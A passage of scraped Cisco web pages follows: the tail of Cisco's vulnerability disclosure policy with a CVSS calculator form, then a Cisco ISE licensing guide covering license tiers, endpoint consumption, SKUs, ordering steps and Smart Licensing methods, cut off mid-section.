| **Release Note Enclosure** | No | No | No | No | No | Yes |

### **Communications Plan**

If one or more of the following conditions exist, Cisco will publicly disclose Cisco Security Advisories:

* The Cisco PSIRT has completed the incident response process and determined that enough software patches or workarounds exist to address the vulnerability, or subsequent public disclosure of code fixes is planned to address high-severity vulnerabilities.
* The Cisco PSIRT has observed active exploitation of a vulnerability that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* There is the potential for increased public awareness of a vulnerability affecting Cisco products and/or cloud-hosted services that could lead to increased risk for Cisco customers. Cisco will accelerate the publication of a security announcement describing the vulnerability that may or may not include a complete set of patches or workarounds.
* The Cisco PSIRT has declared a third-party software vulnerability to be "high profile."

All Cisco security publications are disclosed to customers and the public simultaneously.

When coordinating disclosure with third parties, the Cisco PSIRT will attempt to provide notification of any changes to the Cisco PSIRT public disclosure schedule.

As documented in the [Receiving Security Vulnerability Information from Cisco](#rsvifc) section of this document, Cisco delivers technical security information about software fixes in Cisco products and distributes product updates through several channels. Cisco reserves the right to deviate from this policy on an exception basis to ensure access to Cisco.com for software patch availability.

### **Disclosure Schedule**

In direct response to customer feedback, Cisco releases the following bundles of Cisco Security Advisories at 1600 Greenwich Mean Time (GMT) on a regular schedule twice each year. This schedule applies to the disclosure of vulnerabilities in the following Cisco products and does not apply to the disclosure of vulnerabilities in other Cisco products.

| **Cisco Product(s)** | **Release Schedule** |
| --- | --- |
| Cisco NX-OS Software | Fourth Wednesday of February and August |
| Cisco IOS XR Software | Second Wednesday in March and September |
| Cisco IOS and IOS XE Software | Fourth Wednesday in March and September |

### All Other Products

Cisco generally discloses Cisco Security Advisories at 1600 GMT on any given Wednesday.

### Exceptions

Cisco reserves the right to publish an individual Security Advisory for Cisco IOS and IOS XE Software, Cisco IOS XR Software, or Cisco NX-OS Software or other products outside the published schedule. Conditions under which an out-of-cycle publication may occur include, but are not limited to, the following:

* Cisco detects heightened public awareness of a serious vulnerability.
* Cisco learns of active exploitation of a vulnerability.
* Cisco works with a third-party coordination center to publicly disclose a vulnerability.

### **Incident Response Eligibility**

All customers, regardless of contract status, are eligible to receive support from the Cisco TAC for a known or reasonably suspected security vulnerability in Cisco products and services. For more information about how to contact the Cisco TAC, see the [General Security-Related Queries](https://sec.cloudapps.cisco.com/security/center/resources/security_vulnerability_policy.html#gsrq) section of this document. Customers who contact the Cisco TAC should reference the URL of the Cisco security publication to assist in connecting with the proper support team.

Customers with paid service contracts for incident response and forensic assistance should request assistance through the contact methods specified in their contract.

Cisco, at its sole discretion, may offer customers additional security services free of charge. Cisco reserves the right to determine the type and degree of free assistance it may offer in connection with any incident and to withdraw from such an incident at any time.

### **Security Software Updates**

The Cisco PSIRT will investigate and disclose vulnerabilities in Cisco products and services from the date of First Commercial Shipment (FCS) to the [LDoS](https://www.cisco.com/c/en/us/products/eos-eol-policy.html). Cisco customers with service contracts that entitle them to regular software updates should obtain security fixes through their usual update channels, generally from the Cisco website for the relevant product. Cisco recommends contacting the Cisco TAC only with specific and imminent problems or questions.

As a special customer service, and to improve the overall security of the internet, Cisco may offer customers free software updates to address high-severity security problems. The decision to provide free software updates is made on a case-by-case basis. Refer to the Cisco security publication for details. Free software updates will typically be limited to Critical- and High-severity vulnerabilities.

Fixes for some third-party software vulnerabilities may be available only in the most recent major software releases and not backported to older releases.

If Cisco has offered a free software update to address a specific issue, noncontract customers who are eligible for the update may obtain it by contacting the Cisco TAC using any of the methods described in the [General Security-Related Queries](#gsrq) section of this document.

**Note:** To verify their entitlement, individuals who contact the Cisco TAC should have available the URL of the Cisco document that is offering the update.

Customers may only download, install, and expect support for software releases and feature sets for which they have purchased a valid license that is current and active. By installing, downloading, accessing, or otherwise using such software updates, customers agree to follow the terms of the [Cisco software license agreement](https://www.cisco.com/c/en/us/about/legal/cloud-and-software/end_user_license_agreement.html). In most cases, the software update will be a maintenance release to software that was previously purchased. Free security software updates do not entitle customers to a new software license, additional software feature sets, or major revision upgrades.

After [End of Sale](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) (EoS), the availability of security fixes for vulnerabilities is defined in the product’s EoS bulletin. (See the [End-of-Life Policy](https://www.cisco.com/c/en/us/products/eos-eol-policy.html) for details.) The EoS bulletin may define the Last Day of Support (**LDoS**) milestone, which identifies the last date that Cisco will investigate and disclose product vulnerabilities.

Once the LDoS has been reached, the Cisco PSIRT will continue to accept vulnerability reports but will not analyze, fix, or disclose potential vulnerabilities. To this end, the Cisco PSIRT will not issue CVEs for issues reported on products that are past the LDoS milestone.

### Security Advisory Terms and Conventions

**Fixed Release Availability:** If a future release date is indicated for software, the date provided represents an estimate based on all information known to Cisco as of the "Last Updated" date at the top of the advisory. Availability dates are subject to change based on a number of factors, including satisfactory testing results and delivery of other priority features and fixes. If no version or date is listed for an affected component (indicated by a blank field and/or an advisory designation of Interim), Cisco is continuing to evaluate the fix and will update the advisory as additional information becomes available. After the advisory is marked Final, customers should refer to the associated Cisco bug(s) for further details.

The designated Security Advisory status indicates the following:

**Interim:** The Cisco investigation is ongoing. Cisco will issue revisions to the advisory when additional information, including fixed software release data, becomes available.

**Final:** Cisco has completed its evaluation of the vulnerability described in the advisory. There will be no further updates unless there is a material change in the nature of the vulnerability.

All aspects of this process are subject to change without notice and on a case-by-case basis. No particular level of response is guaranteed for any specific issue or class of issues.

| This tool is used to calculate a specific threat/vulnerability's CVSS score. Please select the appropriate options below, click "Calculate Score," and the CVSS score will be displayed. Use of this calculator is subject to [the disclaimer below.](#disclaimer) |
| ---    | |
| Base Parameters |
| Once discovered, analyzed, and catalogued, there are certain aspects of a vulnerability that do not change, assuming the initial information is complete and correct. These immutable characteristics will not change over time, nor in different environments. The base metric group captures the access to and impact on the target.  Attack Vector AV: Local AV: Adjacent AV: Network AV: Physical  Select Attack Vector Parameters  Attack Complexity AC: Low AC: High  Select Attack Complexity Parameters  Privileges Required PR: None PR: Low PR: High  Select Privileges Required Parameters  User Interaction UI: Required UI: None  Select User Interaction Parameters  Scope S: Unchanged S: Changed  Select Scope Parameters  Confidentiality Impact C: Low C: High C: None  Select Confidentiality Impact Parameters  Integrity Impact I: None I: Low I: High  Select Integrity Impact Parameters  Availability Impact A: Low A: High A: None  Select Availability Impact Parameters    Base Score: 6.1 |
| Temporal Parameters |
| As a vulnerability ages, certain intrinsic characteristics will change with time. In many cases, when a vulnerability is first discovered, the number of vulnerable systems will be at or close to its peak, while the availability of exploit and remedial information will be at its lowest point. As time progresses, patch information will become more available and more systems will be fixed as more exploits occur, driving the need for the fix. Eventually, the number of vulnerable systems will reach its low point as remedial information reaches its high point. The CVSS temporal metrics group captures these characteristics of a vulnerability that change over time.  Exploit Code Maturity E: Functional  E: High  E: Not Defined  E: Proof-of-Concept  E: Unproven   Select Exploit Code Maturity Parameters  Remediation Level RL: Official-Fix  RL: Temporary-Fix  RL: Workaround  RL: Unavailable  RL: Not Defined   Select Remediation Level Parameters  Report Confidence RC: Unknown  RC: Reasonable  RC: Not Defined  RC: Confirmed   Select Report Confidence Parameters     Temporal Score: 6.1 |
| Environmental Parameters |
| Different user environments can have an immense bearing on how (or if) a vulnerability affects a given information system and its stakeholders. The CVSS environmental metrics group captures characteristics of vulnerabilities that are tied to system distribution and network environment.  Confidentiality Requirement CR: Low  CR: Medium  CR: High  CR: Not Defined   Select Confidentiality Requirement Parameters  Integrity Requirement IR: Not Defined  IR: Low  IR: Medium  IR: High   Select Integrity Requirement Parameters  Availability Requirement AR: Low  AR: Medium  AR: High  AR: Not Defined   Select Availability Requirement Parameters  Modified Attack Vector MAV: Local  MAV: Adjacent  MAV: Network  MAV: Physical  MAV: Not Defined   Select Modified Attack Vector Parameters  Modified Attack Complexity MAC: Low  MAC: High  MAC: Not Defined   Select Modified Attack Complexity Parameters  Modified Privileges Required MPR: None  MPR: Low  MPR: High  MPR: Not Defined   Select Modified Privileges Required Parameters  Modified User Interaction MUI: Required  MUI: None  MUI: Not Defined   Select Modified User Interaction Parameters  Modified Scope MS: Unchanged  MS: Changed  MS: Not Defined   Select Modified Scope Parameters  Modified Confidentiality MC: None  MC: Low  MC: High  MC: Not Defined   Select Modified Confidentiality Parameters  Modified Integrity MI: None  MI: Low  MI: High  MI: Not Defined   Select Modified Integrity Parameters  Modified Availability MA: None  MA: Low  MA: High  MA: Not Defined   Select Modified Availability Parameters    Environmental Score: 6.1 |

Bias-Free Language

### Bias-Free Language

The documentation set for this product strives to use bias-free language. For the purposes of this documentation set, bias-free is defined as language that does not imply discrimination based on age, disability, gender, racial identity, ethnic identity, sexual orientation, socioeconomic status, and intersectionality. Exceptions may be present in the documentation due to language that is hardcoded in the user interfaces of the product software, language used based on RFP documentation, or language that is used by a referenced third-party product.

This guide provides information on how Cisco® ISE licensing works and how to calculate the quantity and types of licenses you need for your network.

1. Overview of Cisco Identity Services Engine use cases

Cisco Identity Services Engine (ISE) empowers you to solve a wide range of use cases.

To understand the types and quantities of Cisco ISE licenses you may need, you must first understand the capabilities of Cisco ISE. Cisco ISE is a product that supports a wide range of use cases. See the [Cisco ISE webpage](https://www.cisco.com/c/en_in/products/security/identity-services-engine/index.html#~services) to understand the features of Cisco ISE and how it can address multiple use cases of network visibility, segmentation, and security.

![Cisco ISE use cases](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_0.png)

Figure 1.

Cisco ISE use cases

2. What you need for your Cisco ISE deployment

A Cisco ISE deployment consists of three primary components: Cisco ISE licenses, appliances, and services.

![Cisco ISE deployment](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_1.png)

Figure 2.

Cisco ISE deployment

2.1. Appliances

Cisco ISE may be deployed on any combination of physical and virtual appliances, as well as infrastructure-as-a-service (IaaS) instances in AWS, Azure, and Oracle Cloud. For more details on Cisco ISE appliances, refer to the [Cisco Secure Network Server Data Sheet](https://www.cisco.com/c/en/us/products/collateral/security/identity-services-engine/data_sheet_c78-726524.html). For more details on virtual machine, refer to the section “Cisco ISE Virtual Machine licenses,” later in this guide. For detailed information about Cisco ISE on cloud platforms, please refer to [Deploy Cisco ISE Natively on Cloud Platforms](https://www.cisco.com/c/en/us/td/docs/security/ise/ISE_on_Cloud/b_ISEonCloud.html).

For detailed information about performance and scalability, please refer to the [Performance and Scalability Guide](https://www.cisco.com/c/en/us/td/docs/security/ise/performance_and_scalability/b_ise_perf_and_scale.html).

2.2. Cisco ISE licensing

Cisco ISE licensing provides the ability to manage the application features and access, such as the number of concurrent active endpoints that can use Cisco ISE network resources at any time. Licensing in Cisco ISE is supplied as feature-based packages wherein different features are supported by each license type.

The types of Cisco ISE licensing are:

1.     Tier-based Subscription licenses

2.     Device Admin Licenses

3.     Virtual Machine licenses

4.     IPSec licenses

5.     ISE-PIC Licenses

All licenses are managed in [Smart Licensing](https://www.cisco.com/c/en/us/buy/licensing.html?dtid=osscdc000283) format through Cisco Smart Software Manager (SSM). The Cisco Smart Software Manager is an intuitive portal where you can activate and manage all your Cisco licenses.

Smart Licensing is a new, flexible software licensing model that simplifies the way you can activate and manage licenses across your organization. Instead of using Product Activation Keys (PAKs), Smart Licenses establish a pool of software licenses in a customer-defined Smart Account that can be used across an enterprise. Smart Accounts are mandatory for any subscription. They help identify and connect the right customer accounts into which the license subscriptions purchased by a customer must be deposited. The combination of Smart Licensing and Smart Accounts delivers visibility into your license ownership and consumption (through a cloud portal) to help you reduce operational costs.

2.3. Services

2.3.1. Technical Services

Support for appliances and perpetual licenses

Customers can purchase Cisco Smart Net Total Care® for Cisco ISE physical appliances and Software Support (SWSS) contracts for Cisco ISE virtual machines or the ISE-PIC virtual machine, along with the option to upgrade support to Solution Support. The support for Cisco ISE physical or virtual appliances also covers Base license (for customers still on 2.x) and Device Admin deployments.

Support for subscription licenses

Cisco Software Support Basic (SWSS) is included for the duration of all Cisco ISE subscription licenses. Higher-value service levels, Solution Support and Software Support Enhanced and Premium, are available for all Cisco ISE subscription licenses.

Software Support Enhanced and Premium services provide everything included in Software Support Basic, but with a richer feature set, such as prioritized case handling, direct access to highly skilled engineers with solution-level expertise, and onboarding and technical adoption assistance. For additional information on Software Support for Cisco ISE, please see the [Cisco Support Services for Security Software At-a-Glance](https://www.cisco.com/c/en/us/services/collateral/se/datasheet-c78-742733.html). Please note that Software Support Enhanced is the recommended support level for ISE subscription licenses.

2.3.2. Advisory Services

Cisco offers [Expert Services](https://www.cisco.com/site/us/en/products/security/services/index.html) to address your business objectives with the technology we offer. For example, the [Cisco Security Segmentation Service](https://www.cisco.com/c/dam/m/en_us/partners/market/cisco-security-segmentation-service-aag.pdf) provides a strategic infrastructure segmentation approach to help ensure the success of your segmentation initiative.

2.3.3. Cisco Talos Incident Response

The Cisco Talos Incident Response retainer provides a full suite of proactive and emergency services to help you prepare, respond, and recover from a cybersecurity breach. Cisco Talos Incident Response enables 24-hour emergency response capabilities and direct access to Cisco Talos®, the world's largest threat intelligence and research group.

You can order and transact Cisco Talos Incident Response when ordering Cisco ISE subscriptions. This will provide you yet another option to create a stronger security posture and stay protected in case of a security breach. Cisco Talos Incident Response will automatically attach with right sizing based on product order size. The auto-attached SKU can be removed and is not mandatory. Also, you can manually select from the available Cisco Talos Incident Response options in case of no auto-attach.

The table below shows the Cisco Talos Incident Response options available in a Cisco ISE configuration.

**Table 1.** Cisco Talos Incident Response SKUs

| SKU | Description |
| --- | --- |
| **SVS-CTIR-ISE-S** | Cisco Talos Incident Response Retainer-Small, Attach with ISE |
| **SVS-CTIR-ISE-M** | Cisco Talos Incident Response Retainer-Medium, Attach with ISE |
| **SVS-CTIR-ISE-L** | Cisco Talos Incident Response Retainer-Large, Attach with ISE |

To learn more about Cisco Talos Incident Response, see the [Incident Responses Services](https://www.cisco.com/c/en/us/products/security/sas-incident-response.html) webpage.

**Note:** If you have any further questions about services, reach out to your account manager.

3. Cisco ISE licenses

3.1. Understanding Cisco ISE licenses

![Evaluating Cisco ISE](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_2.png)

Figure 3.

Evaluating Cisco ISE

Cisco ISE, upon installation, grants a 90-day Evaluation license that supports 100 endpoints and enables all Cisco ISE features. You can set up a limited deployment in Evaluation mode and explore all the capabilities and features within Cisco ISE.

A valid Cisco.com login is required to download the software. An existing Cisco ISE support contract may be required to download additional patches or packages.

For more information on your ISE release, please refer to the [Cisco ISE Administrator Guide, Release 3.1](https://www.cisco.com/c/en/us/td/docs/security/ise/3-1/admin_guide/b_ise_admin_3_1.html).

When Evaluation licenses expire at the 90-day mark, administrators can view only the Licensing window in the Cisco ISE administrator portal. No alarms are sent to administrators to notify them of Evaluation license expiration.

You may request an extension to your Evaluation licenses by adding another 90-day Evaluation license. You can also ask for your Evaluation license to support more than 100 endpoints. To increase endpoint support or to extend the Evaluation license duration, open a case via the [SCM tool](//www.cisco.com/go/scm) with your Unique Device Identifiers (UDIs), your license request, and a justification message.

**Note that the UDI information for your Cisco ISE primary and secondary Policy Administration Nodes (PANs) is essential to modify your Evaluation license**.

A UDI consists of:

●      Product identifier (PID)

●      Version identifier (VID)

●      Serial number (SN)

To view your Cisco ISE UDI, log in to your Cisco ISE administrator portal. From the main menu, choose **Administration > System > Licensing**. The UDI Details area contains the required information.

![Evaluating Cisco ISE 2](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_3.jpg)

Alternatively, you can also see the **About Identity Services** **Engine** option in the Cisco ISE administrator portal:

![ISE and Server](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_4.jpg)

To view the UDI details through the Cisco ISE command-line interface, use the **show udi** command:

Admin CLI

Positron-vm-3/admin#show udi

**SPID:** ISE-VM-K9

**VPID:** V01

**Serial:** TNEG8ID3JQ5

3.2. ISE Subscription Licenses

Subscription licenses refer to the licensing based on number of active endpoints you want to manage and secure within your network using ISE. These licenses are a crucial part of ISE deployment as they determine the number of active endpoints that can be authenticated, authorized, monitored or secured by ISE.

ISE subscription licenses are nested, which means that the higher tier licenses include all the lower-tier features. For example, the ISE Premier license includes all the features that are mapped to the ISE Advantage and ISE Essentials licenses. Similarly, the ISE Advantage license includes all the features that are mapped to the ISE Essentials license.

3.2.1. Feature mapping in Subscription Licenses

The following figure shows the mapping of features in ISE Subscription Tier licenses.

![Mapping of 3.x licensing model features](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_5.png)

Figure 4.

Mapping of 3.x licensing model features

\*\*For more information on pxGrid Cloud, please refer to the
[Cisco pxGrid Cloud Solution Guide](https://www.cisco.com/c/en/us/td/docs/security/pxgrid_cloud/solution_guide/pxgrid_cloud_solution_guide.html).

3.2.2. Cisco ISE Subscription license entitlement

When you purchase a license, you agree upon a quantity and duration for which you are purchasing the license. License entitlement refers to the monitoring and enforcement of license usage according to these terms.

A license is out of compliance when:

●      The deployment uses more than 100 percent of active endpoints compared to the quantity purchased.

●      The licenses have expired without renewal.

When a tier license is out of compliance or is nearing renewal:

●      Alerts are displayed in your Cisco ISE GUI every day that the license is out of compliance.

●      For term licenses that are nearing expiration, alerts are displayed at the 90-, 60-, and 30-day marks before expiration, and every day for the last 30 consecutive days before expiration.

During the time that the alerts are displayed, there is no impact to Cisco ISE usage. Existing configurations continue to operate without disruption.

If your Cisco ISE deployment is out of compliance for 30 days in a 60-day period, you will lose all administrative control of Cisco ISE until you purchase and activate the required licenses. Also, visibility and management of the features associated with an out-of-compliance license are affected. A Cisco ISE administrator has a limited read-only capability over the relevant features until the causes of noncompliance are fixed. **Authentications and features will continue to work as configured prior to license expiration**.

If you lose administrative access due to overconsumption and you then reduce the license consumption, the system recovers at the next synchronization with the Smart License Portal. Also, overconsumption for any amount of time during that day will count as a day (within a 24-hour period).

When VM or Device Admin license is out of compliance:

●      Alerts are displayed in your Cisco ISE GUI every day that the license is out of compliance. During this time, ISE GUI page will be visible and manageable.

3.2.3. Subscription Tier License consumption

ISE license consumption is based on active endpoint counts measured through RADIUS sessions. In situations where RADIUS sessions are not present or cannot be correctly counted, then unique endpoint attributes may be used (example: PassiveID etc). If you enable privacy/private MAC/MAC randomization/rotating and changing MAC in endpoints, the license consumption may be higher, as different sessions will be created for the same endpoint getting authenticated a second time with different MAC IDs.

The following table shows ISE licensing consumption.

**Table 2.** ISE licensing consumption

| Feature | License tier | Dictionary/attribute | Trigger of license consumption | When license is released |
| --- | --- | --- | --- | --- |
| **AAA and 802.1X** | Essentials |  | An endpoint establishes a RADIUS session | RADIUS session ends |
| **Guest** | Essentials |  | An endpoint with RADIUS session uses any Guest functionality | RADIUS session ends |
| **Easy Connect (PassiveID)** | Essentials |  | An endpoint with a RADIUS session uses any Easy Connect functionality | RADIUS session ends |
| **Profiling** | Advantage | EndPoints.EndPointPolicy  EndPoints.LogicalProfile | An endpoint with a RADIUS session uses profiling classification in an authorization policy | RADIUS session ends |
| **BYOD (+CA, MDP)** | Advantage | EndPoints.BYODRegistration | An endpoint with a RADIUS session uses its registration status in an authorization policy | RADIUS session ends |
| **pxGrid, pxGrid Cloud, and pxGrid Direct (Context In or Out with Cisco and external third-party products)** | Advantage |  | An endpoint with a RADIUS session connects over pxGrid | RADIUS session ends |
| **Integrations  (non-pxGrid)** | Advantage |  | An endpoint establishes a RADIUS session | RADIUS session ends |
| **Group-Based Policy (Cisco TrustSec**®**)** | Advantage |  | An endpoint establishes a RADIUS session | RADIUS session ends |
| **Endpoint Analytics Visibility/ Enforcement** | Advantage | CMDB\_MODELCATEGORY  CMDB\_SERIAL\_NUMBER  CONCURRENT\_MAC\_ADDRESS  EA\_DEVICE\_TYPE  EA\_HIERARCHY  EA\_MANUFACTURER  EA\_HW\_MODEL  CHANGE\_IN\_MFC\_RESULT  NAT\_DETECTION\_RESULT  EA\_OS | When you use these conditions, it’s going to be under Enforcement. If not, it’s just for visibility. |  |
| **Cisco AnyConnect® with Agent** | Premier | Session.PostureStatus | An endpoint with a RADIUS session receives an authorization based on a posture status other than “Not applicable” | RADIUS session ends |
| **Mobile device management (MDM)** | Premier | MDM.DevicelsRegistered  MDM.DeviceCompliantStatus | An endpoint uses an MDM attribute in an authorization policy | RADIUS session ends |
| **Threat-Centric Network Admission Control (TC-NAC)** | Premier |  | An endpoint uses or triggers threat-based information or action as part of the authorization policy | RADIUS session ends |
| **RTC (ANC)** | Advantage | Session:ANCPolicy | An endpoint with a RADIUS session uses Adaptive Network Control (ANC) policy in an authorization policy | RADIUS session ends |
| **User Defined Network** | Advantage | UDN:Private-group-id  UDN:Private-group-name  UDN:Private-group-owner | An endpoint with RADIUS uses a UDN attribute in an authorization policy | RADIUS sessions ends |
| **Workload Connector** | Advantage |  | A workload IP establishes a session | Workload IP session ends when workload deleted from on-prem/cloud account, connection is suspended on ISE or connection is deleted on ISE |

3.3. Cisco ISE Device Admin license

The Device Admin license (PID: L-ISE-TACACS-ND=) enables TACACS services on a Policy Service Node (PSN).

3.4. Cisco ISE Virtual Machine licenses

Cisco offers a single VM Common license (R-ISE-VMC-K9=) applicable across all VM and cloud platforms and irrespective of VM size. This license is needed when deploying ISE on non-Cisco hardware or Virtual machines.

4. How to order Cisco ISE licenses

All ISE licenses can be ordered from Cisco Commerce (CCW).

For the Subscription licenses, 3 methods of ordering are available:

1.     A-la-carte purchase

2.     Cisco Enterprise Agreements

3.     ISE-Advantage licenses come embedded within [Catalyst Software Subscription for Switching](https://www.cisco.com/site/us/en/products/networking/access-software/dna-subscription-switching/index.html)

4.1. Ordering ISE Subscription licenses a-la-carte

●      Cisco ISE Subscription licenses are ordered from Cisco Commerce (CCW). These can be ordered in any quantity, starting with 50.

●      Subscription-based licenses are available in 1-, 3-, and 5-year terms allowing the licenses to be co-termed.

●      The default start date is 3 days from the date of purchase. You can choose a different start date, up to 90 days from the date of purchase. However, you must specify the request to change the start date at the time of placing the order. The start date should be set based on the lead time of the hardware appliance. For example, if the appliance on which you will be installing ISE will not be available for 45 days, set the ISE subscription start date beyond 45 days. For longer lead times, consider buying ISE subscription licenses in a separate order once the hardware has been procured.

You can order three types of SKUs for ISE when buying the Subscription a-la-carte:

●      Subscription SKU: Defines the subscription term and start date

●      Product SKU: Defines the products and quantities that make up the subscription

●      Support SKU: Defines the level of support for the subscription

The steps are given below.

Figure 5.

Steps for ordering ISE licenses

**Step 1:** Selecting the subscription SKU.

There is one Cisco ISE subscription SKU (ISE-SEC-SUB). There is no price for this SKU. Pricing is determined when product SKUs are added and configured. A quantity of 1 should be selected because each end customer may have one, and only one, subscription. Product quantities will be entered when the product SKUs are added to the subscription.

After selecting the subscription SKU, choose Select Options to edit the subscription term and the requested start date.

![Steps for ordering ISE licenses](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_7.jpg)

The subscription term will default to 36 months (3 years). To change the term, see the screen shot below.

![Changing Subscription term on CCW](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_8.png)

The requested start date may also be changed at this time.

The service is provisioned and the subscription starts on the service start date. The provisioning of the service may take up to 72 hours, assuming the order information is complete and correct.

**Step 2:** Selecting the product SKU

When the subscription terms have been set, the next step is to add products to the subscription. The term for the product is defined by the subscription term. Start by selecting the appropriate product in the subscription configuration summary. The guidance shown below uses ISE-P-LIC as an example. Having chosen to configure the subscription for the product, you then enter the quantity based on the number of sessions.

![Selecting Billing SKUs on CCW](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_9.png)

Pricing is determined dynamically according to the quantity ordered and the term, and is based on a tiered pricing model. Per-month prices are displayed for the selected SKU. However, billing is prepaid for the term of the subscription, and the term amount is shown in the subtotal. The screen shot below shows a sample of dynamic pricing based on 100 sessions of ISE-E-LIC and 1500 sessions of ISE-P-LIC selected for a term of 3 years.

![Selecting Billing SKU quantity on CCW to view dynamic pricing](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_10.png)

**Step 3:** Selecting the support SKU

After the products have been added, the next step is to define the support level desired for the subscription. There are three Cisco ISE support SKUs, corresponding to the three levels of support. To configure support for the subscription, start by selecting Cisco ISE Support Options in the subscription configuration summary:

Cisco Software Support Basic is included for the duration of Cisco ISE subscription licenses. Higher-value service levels, Solution Support, or Software Support Enhanced or Premium Support may be purchased by selecting the appropriate level of support from the support options.

Prices for these higher-value services levels are calculated dynamically based on a percentage of the product cost and must meet annual minimum requirements, where needed. The support level must be consistent across all endpoints. Customers cannot purchase one support level for some endpoints and a different support level for others.

![Service SKU selection on CCW](/c/dam/en/us/products/collateral/security/identity-services-engine/ise-licensing-guide-og.docx/_jcr_content/renditions/ise-licensing-guide-og_11.png)

4.2 Ordering ISE Subscription licenses in AWS and Microsoft Azure Marketplace

Cisco ISE licenses are now available in AWS and Microsoft Azure Marketplace.

Ordering process for ISE in AWS:

1.     AWS customer with EDP can create a Private Offer request in [AWS Marketplace](https://aws.amazon.com/marketplace/pp/prodview-uvsybra7r3iug)

2.     A specially created private offer is provided to the AWS customer

3.     Customer accepts the private offer

4.     Order is processed as per customers’ request

5.     Customer downloads existing ISE BYOL AMI/Software and deploys on EC2 instances

For Ordering ISE in Microsoft Azure, customers should work with their Cisco partners who can extend a private offer through Azure. For more information of Cisco ISE on Azure, please refer to Microsoft Azure Marketplace.

4.3. Changing existing orders or subscriptions

Cisco Commerce (CCW) provides you the capability to modify, renew, and replace subscriptions for your active orders including changes to quantities or upgrading tiers.

For more information, refer to the [Change Subscription Job Aid](https://www.cisco.com/E-Learning/gbo-ccw/cdc_bulk/Cisco_Commerce_Q1FY19_September_Release/Cisco_Commerce_Change_Subscription_Job_Aid.pdf).

4.4. Other ISE License SKUs based on your deployment

Apart from the subscription, product, and service SKUs, you also need to choose SKUs as required to cover the Cisco hardware appliances, virtual machines, and Device Admin nodes in your deployment. All the below licenses are perpetual in nature.

●      **Cisco ISE Device Admin SKU** (L-ISE-TACACS-ND=): Purchase one license for each PSN on which you wish to enable TACACS services.

●      **Cisco ISE VM License SKU (R-ISE-VMC-K9=): Purchase a license for each virtual machine or cloud-deployed ISE node in your deployment**.

●      **Cisco ISE VM License SKU** (R-ISE-VMF-K9=): This is a special free VM license of 1 quantity available for eligible first-time ISE customers who receive ISE Subscription Tier licenses through the purchase of [Catalyst Advantage Subscription for Switching](https://www.cisco.com/site/us/en/products/networking/access-software/dna-subscription-switching/index.html). Customers can contact their Channel Partners or Cisco Account teams to see if they would be eligible.

●      **Cisco ISE-PIC License SKUs** (R-ISE-PIC-VM-K9= and L-ISE-PIC-UPG=): ISE-PIC is ISE with only the Passive Identity Connector (PIC) function. The SKU R-ISE-PIC-VM-K9= allows 3000 ISE-PIC sessions per ISE deployment. Purchasing the ISE-PIC-Upgrade SKU L-ISE-PIC-UPG= in addition to R-ISE-PIC-VM-K9= allows 300,000 ISE-PIC sessions. For more information on the ISE PIC, please refer to the [Cisco ISE Passive Identity Connector Data Sheet](https://www.cisco.com/c/en/us/products/collateral/security/identity-services-engine/datasheet-c78-738846.html).

If an ISE-PIC node also has the ISE-PIC upgrade license, you can assign Essentials licenses to it, thereby making it an ISE server with full functionality. Please note that the features enabled in the ‘full ISE’ will depend on the available Subscription or other licenses. For example, enabling pxGrid requires Advantage licenses as stated in above sections.

5. Specific ISE Licensing Methods based on deployment

The Cisco ISE licenses that are available in your account are displayed in the SSM portal for you to monitor and manage.

You can configure Cisco ISE Smart Licensing through various methods, depending on the needs of your organization.

**Choose a licensing method:**

Smart Licensing for connected networks

Smart Licensing for air-gapped networks (SSM on-premises servers)

Specific License Reservation

5.1. Licensing with persistent Internet connection

**Support notes:** This licensing method is supported by Cisco ISE Release 2.4 and later.

If your Cisco ISE has a persistent internet connection, Smart Licensing is easily managed through consistent communication between Cisco ISE and the SSM. Direct internet connections and proxy servers are both supported by this Smart Licensing method.

5.2. Licensing in an air-gapped network with SSM on-prem

Cisco ISE Release 2.6 and later supports the use of SSM on-premises servers for Smart Licensing.

Cisco ISE Smart Licensing requires Cisco ISE to be connected to the SSM. If your network is air-gapped, Cisco ISE is unable to report license usage to SSM. This lack of reporting results in a loss of administrative access to Cisco ISE and restrictions in Cisco ISE features.

To avoid licensing issues in air-gapped networks and enable full Cisco ISE functionality, configure SSM On-Prem. This server takes over the role of Cisco SSM in your air-gapped network, releasing license entitlements as needed, and tracking usage metrics. The SSM on-premises server also sends notifications, alarms, and warning messages that are related to licensing consumption and validity.

5.3. Specific License Reservation (SLR)

**Support note:** Supported in Cisco ISE Release 3.1 and later.

Cisco ISE Smart Licensing requires Cisco ISE to be connected to the Cisco SSM. Cisco ISE Release 3.0 and later supports only Smart Licensing. If your network is air-gapped, Cisco ISE 3.x deployments are unable to report license usage to the SSM, and this results in a loss of administrative access to Cisco ISE and restrictions in Cisco ISE features.

Specific License Reservation enables you to deploy a software license on a device without communicating usage information to Cisco. This functionality is especially useful in highly secure networks, and it is supported on platforms that have Smart Licensing enabled.

Customers must be aware of following licensing processes while using SLR:

A.   Purchasing and reserving the right tiers and quantities for Primary PAN

B.   Purchasing and reserving the right tiers and quantities for Secondary PAN

**Primary PAN:**

